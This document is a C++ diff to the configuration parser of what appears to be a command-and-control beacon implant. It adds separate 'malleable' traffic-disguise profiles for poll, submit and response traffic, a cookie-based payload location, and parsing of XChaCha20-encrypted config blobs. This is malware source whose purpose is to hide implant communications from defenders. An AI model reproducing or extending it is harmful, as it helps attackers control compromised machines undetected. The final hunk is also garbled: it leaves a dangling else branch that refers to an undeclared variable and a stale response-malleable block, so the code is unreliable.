@@ -54,6 +54,7 @@ static void cleanupMalleableBlock(PCFG_ChannelMalleable* mcfg) {
     freeStr(mcfg->payload_location.param_name);
     freeStr(mcfg->payload_location.path_prefix);
     freeStr(mcfg->payload_location.path_suffix);
+    freeStr(mcfg->payload_location.cookie_name);
     __memset(mcfg, 0, sizeof(*mcfg));
 }
 
@@ -118,7 +119,7 @@ static size_t parseMalleableBlock(const uint8_t* data, size_t data_len, PCFG_Cha
 
     // Payload location
     if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
-    mcfg->payload_location.type = data[offset++];
+    mcfg->payload_location.type = static_cast<PCFG_LOCATION_TYPE>(data[offset++]);
 
     // param_name
     if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
@@ -146,7 +147,21 @@ static size_t parseMalleableBlock(const uint8_t* data, size_t data_len, PCFG_Cha
 
     // body_content_type
     if (offset + 1 > data_len) { cleanupMalleableBlock(mcfg); return 0; }
-    mcfg->payload_location.body_content_type = data[offset++];
+    mcfg->payload_location.body_content_type = static_cast<PCFG_BODY_CONTENT_TYPE>(data[offset++]);
+
+    // cookie_name (optional)
+    mcfg->payload_location.cookie_name = nullptr;
+    mcfg->payload_location.cookie_name_len = 0;
+    if (offset + 1 <= data_len) {
+        uint8_t cn_len = data[offset++];
+        if (cn_len > 0) {
+            if (offset + cn_len > data_len) { cleanupMalleableBlock(mcfg); return 0; }
+            mcfg->payload_location.cookie_name = allocString(data + offset, cn_len);
+            if (!mcfg->payload_location.cookie_name) { cleanupMalleableBlock(mcfg); return 0; }
+            mcfg->payload_location.cookie_name_len = cn_len;
+            offset += cn_len;
+        }
+    }
 
     return offset;
 }
@@ -155,26 +170,27 @@ static size_t parseMalleableBlock(const uint8_t* data, size_t data_len, PCFG_Cha
  * parseC2Channel - Parse C2 channel from binary data
  * ============================================================================ */
 
-size_t parseC2Channel(const uint8_t* data, size_t data_len, PCFG_C2Channel* channel, PCFG_ChannelMalleable* chMalleable) {
+size_t parseC2Channel(const uint8_t* data, size_t data_len,
+                      PCFG_C2Channel* channel,
+                      PCFG_ChannelMalleable* pollMalleable,
+                      PCFG_ChannelMalleable* submitMalleable,
+                      PCFG_ChannelMalleable* pollRespMalleable,
+                      PCFG_ChannelMalleable* submitRespMalleable)
+{
     if (data_len < 14) return 0;  // Minimum: 13 header bytes + at least 1 byte of strings
 
     size_t offset = 0;
 
     // Read type
-    channel->type = data[offset++];
-    if (channel->type < PCFG_CHANNEL_HTTP || channel->type > PCFG_CHANNEL_TCP) {
+    channel->type = static_cast<PCFG_ChannelType>(data[offset++]);
+    if (channel->type < PCFG_ChannelType::HTTP || channel->type > PCFG_ChannelType::PIPE) {
         return 0;
     }
 
-    // Read http_method (0=GET, 1=POST)
-    channel->http_method = data[offset++];
-    if (channel->http_method > PCFG_HTTP_METHOD_POST) {
-        channel->http_method = PCFG_HTTP_METHOD_GET;
-    }
-
-    // Read string lengths
+    // Read string lengths (no http_method byte now)
     channel->host_len = data[offset++];
-    channel->path_len = data[offset++];
+    channel->poll_path_len = data[offset++];
+    channel->submit_path_len = data[offset++];
     channel->ua_len = data[offset++];
 
     // Skip reserved byte
@@ -196,7 +212,7 @@ size_t parseC2Channel(const uint8_t* data, size_t data_len, PCFG_C2Channel* chan
     offset += 4;
 
     // Validate we have enough data for strings
-    size_t strings_len = channel->host_len + channel->path_len + channel->ua_len;
+    size_t strings_len = channel->host_len + channel->poll_path_len + channel->submit_path_len + channel->ua_len;
     if (offset + strings_len > data_len) return 0;
 
     // Allocate and read host string
@@ -204,34 +220,70 @@ size_t parseC2Channel(const uint8_t* data, size_t data_len, PCFG_C2Channel* chan
     if (!channel->host) return 0;
     offset += channel->host_len;
 
-    // Allocate and read path string
-    channel->path = allocString(data + offset, channel->path_len);
-    if (!channel->path) return 0;
-    offset += channel->path_len;
+    // Allocate and read poll_path string
+    channel->poll_path = allocString(data + offset, channel->poll_path_len);
+    if (!channel->poll_path) { freeStr(channel->host); return 0; }
+    offset += channel->poll_path_len;
+
+    // Allocate and read submit_path string
+    channel->submit_path = allocString(data + offset, channel->submit_path_len);
+    if (!channel->submit_path) { freeStr(channel->host); freeStr(channel->poll_path); return 0; }
+    offset += channel->submit_path_len;
 
     // Allocate and read user_agent string
     channel->user_agent = allocString(data + offset, channel->ua_len);
-    if (!channel->user_agent) return 0;
+    if (!channel->user_agent) { freeStr(channel->host); freeStr(channel->poll_path); freeStr(channel->submit_path); return 0; }
     offset += channel->ua_len;
 
-    // Read malleable_mode byte
-    if (offset + 1 > data_len) {
+    // ---- Sub-helper to avoid repetitive cleanup code ----
+    auto cleanup = [&]() {
         freeStr(channel->host);
-        freeStr(channel->path);
+        freeStr(channel->poll_path);
+        freeStr(channel->submit_path);
         freeStr(channel->user_agent);
-        return 0;
-    }
-    channel->malleable_mode = data[offset++];
+    };
 
-    // Parse inline malleable if present
-    if (channel->malleable_mode == PCFG_MALLEABLE_INLINE && chMalleable) {
-        size_t consumed = parseMalleableBlock(data + offset, data_len - offset, chMalleable);
-        if (consumed == 0) {
-            freeStr(channel->host);
-            freeStr(channel->path);
-            freeStr(channel->user_agent);
-            return 0;  // parse error - strings already freed
-        }
+    // Read poll_malleable_mode byte
+    if (offset + 1 > data_len) { cleanup(); return 0; }
+    channel->poll_malleable_mode = static_cast<PCFG_MALLEABLE_MODE>(data[offset++]);
+
+    // Parse inline poll malleable if present
+    if (channel->poll_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && pollMalleable) {
+        size_t consumed = parseMalleableBlock(data + offset, data_len - offset, pollMalleable);
+        if (consumed == 0) { cleanup(); return 0; }
+        offset += consumed;
+    }
+
+    // Read submit_malleable_mode byte
+    if (offset + 1 > data_len) { cleanup(); return 0; }
+    channel->submit_malleable_mode = static_cast<PCFG_MALLEABLE_MODE>(data[offset++]);
+
+    // Parse inline submit malleable if present
+    if (channel->submit_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && submitMalleable) {
+        size_t consumed = parseMalleableBlock(data + offset, data_len - offset, submitMalleable);
+        if (consumed == 0) { cleanup(); return 0; }
+        offset += consumed;
+    }
+
+    // Read poll_response_malleable_mode byte
+    if (offset + 1 > data_len) { cleanup(); return 0; }
+    channel->poll_response_malleable_mode = static_cast<PCFG_MALLEABLE_MODE>(data[offset++]);
+
+    // Parse inline poll response malleable if present
+    if (channel->poll_response_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && pollRespMalleable) {
+        size_t consumed = parseMalleableBlock(data + offset, data_len - offset, pollRespMalleable);
+        if (consumed == 0) { cleanup(); return 0; }
+        offset += consumed;
+    }
+
+    // Read submit_response_malleable_mode byte
+    if (offset + 1 > data_len) { cleanup(); return 0; }
+    channel->submit_response_malleable_mode = static_cast<PCFG_MALLEABLE_MODE>(data[offset++]);
+
+    // Parse inline submit response malleable if present
+    if (channel->submit_response_malleable_mode == PCFG_MALLEABLE_MODE::INLINE && submitRespMalleable) {
+        size_t consumed = parseMalleableBlock(data + offset, data_len - offset, submitRespMalleable);
+        if (consumed == 0) { cleanup(); return 0; }
         offset += consumed;
     }
 
@@ -250,37 +302,115 @@ void freeConfig(BeaconConfig* config) {
         for (uint8_t i = 0; i < config->channel_count; i++) {
             PCFG_C2Channel* ch = &config->channels[i];
             freeStr(ch->host);
-            freeStr(ch->path);
+            freeStr(ch->poll_path);
+            freeStr(ch->submit_path);
             freeStr(ch->user_agent);
 
-            // Free per-channel malleable
-            if (config->channel_malleable) {
-                PCFG_ChannelMalleable* cm = &config->channel_malleable[i];
+            // Free per-channel poll malleable
+            if (config->channel_poll_malleable) {
+                PCFG_ChannelMalleable* cm = &config->channel_poll_malleable[i];
                 freeStr(cm->wrapper_prefix);
                 freeStr(cm->wrapper_suffix);
                 freeHeaderList(cm->headers);
                 freeStr(cm->payload_location.param_name);
                 freeStr(cm->payload_location.path_prefix);
                 freeStr(cm->payload_location.path_suffix);
+                freeStr(cm->payload_location.cookie_name);
+            }
+
+            // Free per-channel submit malleable
+            if (config->channel_submit_malleable) {
+                PCFG_ChannelMalleable* cm = &config->channel_submit_malleable[i];
+                freeStr(cm->wrapper_prefix);
+                freeStr(cm->wrapper_suffix);
+                freeHeaderList(cm->headers);
+                freeStr(cm->payload_location.param_name);
+                freeStr(cm->payload_location.path_prefix);
+                freeStr(cm->payload_location.path_suffix);
+                freeStr(cm->payload_location.cookie_name);
+            }
+
+            // Free per-channel poll response malleable
+            if (config->channel_poll_response_malleable) {
+                PCFG_ChannelMalleable* rm = &config->channel_poll_response_malleable[i];
+                freeStr(rm->wrapper_prefix);
+                freeStr(rm->wrapper_suffix);
+                freeHeaderList(rm->headers);
+                freeStr(rm->payload_location.param_name);
+                freeStr(rm->payload_location.path_prefix);
+                freeStr(rm->payload_location.path_suffix);
+                freeStr(rm->payload_location.cookie_name);
+            }
+
+            // Free per-channel submit response malleable
+            if (config->channel_submit_response_malleable) {
+                PCFG_ChannelMalleable* rm = &config->channel_submit_response_malleable[i];
+                freeStr(rm->wrapper_prefix);
+                freeStr(rm->wrapper_suffix);
+                freeHeaderList(rm->headers);
+                freeStr(rm->payload_location.param_name);
+                freeStr(rm->payload_location.path_prefix);
+                freeStr(rm->payload_location.path_suffix);
+                freeStr(rm->payload_location.cookie_name);
             }
         }
         __free(config->channels);
         config->channels = nullptr;
     }
 
-    // Free per-channel malleable array
-    if (config->channel_malleable) {
-        __free(config->channel_malleable);
-        config->channel_malleable = nullptr;
+    // Free per-channel malleable arrays
+    if (config->channel_poll_malleable) {
+        __free(config->channel_poll_malleable);
+        config->channel_poll_malleable = nullptr;
+    }
+    if (config->channel_submit_malleable) {
+        __free(config->channel_submit_malleable);
+        config->channel_submit_malleable = nullptr;
+    }
+    if (config->channel_poll_response_malleable) {
+        __free(config->channel_poll_response_malleable);
+        config->channel_poll_response_malleable = nullptr;
+    }
+    if (config->channel_submit_response_malleable) {
+        __free(config->channel_submit_response_malleable);
+        config->channel_submit_response_malleable = nullptr;
     }
 
-// Free global malleable
-    freeStr(config->global_malleable.wrapper_prefix);
-    freeStr(config->global_malleable.wrapper_suffix);
-    freeHeaderList(config->global_malleable.headers);
-    freeStr(config->global_malleable.payload_location.param_name);
-    freeStr(config->global_malleable.payload_location.path_prefix);
-    freeStr(config->global_malleable.payload_location.path_suffix);
+    // Free global poll malleable
+    freeStr(config->global_poll_malleable.wrapper_prefix);
+    freeStr(config->global_poll_malleable.wrapper_suffix);
+    freeHeaderList(config->global_poll_malleable.headers);
+    freeStr(config->global_poll_malleable.payload_location.param_name);
+    freeStr(config->global_poll_malleable.payload_location.path_prefix);
+    freeStr(config->global_poll_malleable.payload_location.path_suffix);
+    freeStr(config->global_poll_malleable.payload_location.cookie_name);
+
+    // Free global submit malleable
+    freeStr(config->global_submit_malleable.wrapper_prefix);
+    freeStr(config->global_submit_malleable.wrapper_suffix);
+    freeHeaderList(config->global_submit_malleable.headers);
+    freeStr(config->global_submit_malleable.payload_location.param_name);
+    freeStr(config->global_submit_malleable.payload_location.path_prefix);
+    freeStr(config->global_submit_malleable.payload_location.path_suffix);
+    freeStr(config->global_submit_malleable.payload_location.cookie_name);
+
+    // Free global poll response malleable
+    freeStr(config->global_poll_response_malleable.wrapper_prefix);
+    freeStr(config->global_poll_response_malleable.wrapper_suffix);
+    freeHeaderList(config->global_poll_response_malleable.headers);
+    freeStr(config->global_poll_response_malleable.payload_location.param_name);
+    freeStr(config->global_poll_response_malleable.payload_location.path_prefix);
+    freeStr(config->global_poll_response_malleable.payload_location.path_suffix);
+    freeStr(config->global_poll_response_malleable.payload_location.cookie_name);
+
+    // Free global submit response malleable
+    freeStr(config->global_submit_response_malleable.wrapper_prefix);
+    freeStr(config->global_submit_response_malleable.wrapper_suffix);
+    freeHeaderList(config->global_submit_response_malleable.headers);
+    freeStr(config->global_submit_response_malleable.payload_location.param_name);
+    freeStr(config->global_submit_response_malleable.payload_location.path_prefix);
+    freeStr(config->global_submit_response_malleable.payload_location.path_suffix);
+    freeStr(config->global_submit_response_malleable.payload_location.cookie_name);
 
     // Free indirect_pivot
     if (config->indirect_pivot) {
@@ -334,20 +464,11 @@ bool parseConfig(functionTable* functionTable, const uint8_t* blob, size_t blob_
 
     if (version == PCFG_VERSION_XCHACHA) {
         // ===== V2: XChaCha20-Poly1305 encrypted =====
-        struct V2Header {
-            uint32_t magic;
-            uint16_t version;
-            uint16_t reserved;
-            uint8_t  nonce[24];
-            uint32_t ciphertext_len;
-        };
-        static_assert(sizeof(V2Header) == 36, "V2 header must be 36 bytes");
-
-        if (blob_len < sizeof(V2Header) + 16) {
+        if (blob_len < sizeof(PCFG_Header) + 16) {
             return false;
         }
 
-        const V2Header* header = reinterpret_cast<const V2Header*>(blob);
+        const PCFG_Header* header = reinterpret_cast<const PCFG_Header*>(blob);
 
         // Decrypt payload (max 2048 bytes for config)
         uint8_t decrypted[2048];
@@ -355,7 +476,7 @@ bool parseConfig(functionTable* functionTable, const uint8_t* blob, size_t blob_
             return false;
         }
 
-        const uint8_t* ciphertext = blob + sizeof(V2Header);
+        const uint8_t* ciphertext = blob + sizeof(PCFG_Header);
 
         size_t decrypted_len = 0;
         int result = xchacha20poly1305_decrypt(
@@ -391,39 +512,89 @@ bool parseConfig(functionTable* functionTable, const uint8_t* blob, size_t blob_
         if (!config->channels) return false;
         __memset(config->channels, 0, sizeof(PCFG_C2Channel) * config->channel_count);
 
-        // --- Allocate per-channel malleable array ---
-        config->channel_malleable = (PCFG_ChannelMalleable*)__malloc(
+        // Helper lambda for freeing a malleable block on error
+        auto freePerChannelMalleable = [](PCFG_ChannelMalleable* arr, uint8_t count) {
+            if (!arr) return;
+            for (uint8_t j = 0; j < count; j++) {
+                PCFG_ChannelMalleable* cm = &arr[j];
+                freeStr(cm->wrapper_prefix);
+                freeStr(cm->wrapper_suffix);
+                freeHeaderList(cm->headers);
+                freeStr(cm->payload_location.param_name);
+                freeStr(cm->payload_location.path_prefix);
+                freeStr(cm->payload_location.path_suffix);
+                freeStr(cm->payload_location.cookie_name);
+            }
+        };
+
+        // --- Allocate per-channel poll malleable array ---
+        config->channel_poll_malleable = (PCFG_ChannelMalleable*)__malloc(
             sizeof(PCFG_ChannelMalleable) * config->channel_count);
-        if (!config->channel_malleable) {
-            __free(config->channels);
-            config->channels = nullptr;
+        if (!config->channel_poll_malleable) {
+            __free(config->channels); config->channels = nullptr;
             return false;
         }
-        __memset(config->channel_malleable, 0, sizeof(PCFG_ChannelMalleable) * config->channel_count);
+        __memset(config->channel_poll_malleable, 0, sizeof(PCFG_ChannelMalleable) * config->channel_count);
+
+        // --- Allocate per-channel submit malleable array ---
+        config->channel_submit_malleable = (PCFG_ChannelMalleable*)__malloc(
+            sizeof(PCFG_ChannelMalleable) * config->channel_count);
+        if (!config->channel_submit_malleable) {
+            __free(config->channels); config->channels = nullptr;
+            __free(config->channel_poll_malleable); config->channel_poll_malleable = nullptr;
+            return false;
+        }
+        __memset(config->channel_submit_malleable, 0, sizeof(PCFG_ChannelMalleable) * config->channel_count);
+
+        // --- Allocate per-channel poll response malleable array ---
+        config->channel_poll_response_malleable = (PCFG_ChannelMalleable*)__malloc(
+            sizeof(PCFG_ChannelMalleable) * config->channel_count);
+        if (!config->channel_poll_response_malleable) {
+            __free(config->channels); config->channels = nullptr;
+            __free(config->channel_poll_malleable); config->channel_poll_malleable = nullptr;
+            __free(config->channel_submit_malleable); config->channel_submit_malleable = nullptr;
+            return false;
+        }
+        __memset(config->channel_poll_response_malleable, 0, sizeof(PCFG_ChannelMalleable) * config->channel_count);
+
+        // --- Allocate per-channel submit response malleable array ---
+        config->channel_submit_response_malleable = (PCFG_ChannelMalleable*)__malloc(
+            sizeof(PCFG_ChannelMalleable) * config->channel_count);
+        if (!config->channel_submit_response_malleable) {
+            __free(config->channels); config->channels = nullptr;
+            __free(config->channel_poll_malleable); config->channel_poll_malleable = nullptr;
+            __free(config->channel_submit_malleable); config->channel_submit_malleable = nullptr;
+            __free(config->channel_poll_response_malleable); config->channel_poll_response_malleable = nullptr;
+            return false;
+        }
+        __memset(config->channel_submit_response_malleable, 0, sizeof(PCFG_ChannelMalleable) * config->channel_count);
 
         // --- Parse each channel ---
         for (uint8_t i = 0; i < config->channel_count; i++) {
             size_t consumed = parseC2Channel(
                 decrypted + offset, payload_len - offset,
-                &config->channels[i], &config->channel_malleable[i]);
+                &config->channels[i],
+                &config->channel_poll_malleable[i],
+                &config->channel_submit_malleable[i],
+                &config->channel_poll_response_malleable[i],
+                &config->channel_submit_response_malleable[i]);
             if (consumed == 0) {
                 // Cleanup on failure
                 for (uint8_t j = 0; j < i; j++) {
                     freeStr(config->channels[j].host);
-                    freeStr(config->channels[j].path);
+                    freeStr(config->channels[j].poll_path);
+                    freeStr(config->channels[j].submit_path);
                     freeStr(config->channels[j].user_agent);
-                    PCFG_ChannelMalleable* cm = &config->channel_malleable[j];
-                    freeStr(cm->wrapper_prefix);
-                    freeStr(cm->wrapper_suffix);
-                    freeHeaderList(cm->headers);
-                    freeStr(cm->payload_location.param_name);
-                    freeStr(cm->payload_location.path_prefix);
-                    freeStr(cm->payload_location.path_suffix);
                 }
-                __free(config->channels);
-                __free(config->channel_malleable);
-                config->channels = nullptr;
-                config->channel_malleable = nullptr;
+                freePerChannelMalleable(config->channel_poll_malleable, i);
+                freePerChannelMalleable(config->channel_submit_malleable, i);
+                freePerChannelMalleable(config->channel_poll_response_malleable, i);
+                freePerChannelMalleable(config->channel_submit_response_malleable, i);
+                __free(config->channels); config->channels = nullptr;
+                __free(config->channel_poll_malleable); config->channel_poll_malleable = nullptr;
+                __free(config->channel_submit_malleable); config->channel_submit_malleable = nullptr;
+                __free(config->channel_poll_response_malleable); config->channel_poll_response_malleable = nullptr;
+                __free(config->channel_submit_response_malleable); config->channel_submit_response_malleable = nullptr;
                 return false;
             }
             offset += consumed;
@@ -547,30 +718,65 @@ bool parseConfig(functionTable* functionTable, const uint8_t* blob, size_t blob_
             config->options.lazy_checkin = 0;
         }
 
-        // --- Read has_global_malleable ---
-        config->has_malleable_config = false;
-        __memset(&config->global_malleable, 0, sizeof(PCFG_ChannelMalleable));
-
-        if (offset + 1 <= payload_len) {
-            uint8_t has_global = decrypted[offset++];
-            if (has_global == true) {
-                c_debugPrint(functionTable,"[parseConfig] Found global malleable block, parsing...");
-                size_t consumed = parseMalleableBlock(decrypted + offset, payload_len - offset,
-                    &config->global_malleable);
-                if (consumed == 0) {
-                    // Failed to parse global - parseMalleableBlock already zeroed partial allocations.
-                    // Treat as absent (has_malleable_config already false from init above).
-                    c_debugPrint(functionTable, "[parseConfig] Failed to parse global malleable block");
-                } else {
-                    config->has_malleable_config = true;
+        // --- Helper lambda for parsing a global malleable block ---
+        auto parseGlobalMalleable = [&](const char* label, PCFG_ChannelMalleable* out, bool* has_out) -> bool {
+            *has_out = false;
+            __memset(out, 0, sizeof(PCFG_ChannelMalleable));
+            if (offset + 1 <= payload_len) {
+                uint8_t present = decrypted[offset++];
+                if (present == true) {
+                    c_debugPrint(functionTable, "[parseConfig] Found global %s malleable block, parsing...", label);
+                    size_t consumed = parseMalleableBlock(decrypted + offset, payload_len - offset, out);
+                    if (consumed == 0) {
+                        c_debugPrint(functionTable, "[parseConfig] Failed to parse global %s malleable block", label);
+                        return false;
+                    }
+                    *has_out = true;
                     offset += consumed;
-                    c_debugPrint(functionTable, "[parseConfig] Global malleable parsed: has=%u, wrapper_prefix_len=%u, wrapper_suffix_len=%u",
-                        (unsigned)config->has_malleable_config,
-                        (unsigned)config->global_malleable.wrapper_prefix_len,
-                        (unsigned)config->global_malleable.wrapper_suffix_len);
+                    c_debugPrint(functionTable, "[parseConfig] Global %s malleable parsed", label);
+                    return true;
+                } else {
+                    c_debugPrint(functionTable, "[parseConfig] No global %s malleable (0x%02x)", label, (unsigned)present);
                 }
+            }
+            return false;
+        };
+
+        // --- Read global poll malleable ---
+        parseGlobalMalleable("poll", &config->global_poll_malleable, &config->has_poll_malleable_config);
+
+        // --- Read global submit malleable ---
+        parseGlobalMalleable("submit", &config->global_submit_malleable, &config->has_submit_malleable_config);
+
+        // --- Read global poll response malleable ---
+        parseGlobalMalleable("poll_response", &config->global_poll_response_malleable, &config->has_poll_response_malleable_config);
+
+        // --- Read global submit response malleable ---
+        parseGlobalMalleable("submit_response", &config->global_submit_response_malleable, &config->has_submit_response_malleable_config);
             } else {
                 c_debugPrint(functionTable, "[parseConfig] No global malleable (has_global=0x%02x)", (unsigned)has_global);
+            }
+        }
+
+        // --- Read has_global_response_malleable ---
+        config->has_response_malleable_config = false;
+        __memset(&config->global_response_malleable, 0, sizeof(PCFG_ChannelMalleable));
+
+        if (offset + 1 <= payload_len) {
+            uint8_t has_global_resp = decrypted[offset++];
+            if (has_global_resp == true) {
+                c_debugPrint(functionTable, "[parseConfig] Found global response malleable block, parsing...");
+                size_t consumed = parseMalleableBlock(decrypted + offset, payload_len - offset,
+                    &config->global_response_malleable);
+                if (consumed == 0) {
+                    c_debugPrint(functionTable, "[parseConfig] Failed to parse global response malleable block");
+                } else {
+                    config->has_response_malleable_config = true;
+                    offset += consumed;
+                    c_debugPrint(functionTable, "[parseConfig] Global response malleable parsed");
+                }
+            } else {
+                c_debugPrint(functionTable, "[parseConfig] No global response malleable (has_global_resp=0x%02x)", (unsigned)has_global_resp);
             }
         }
 
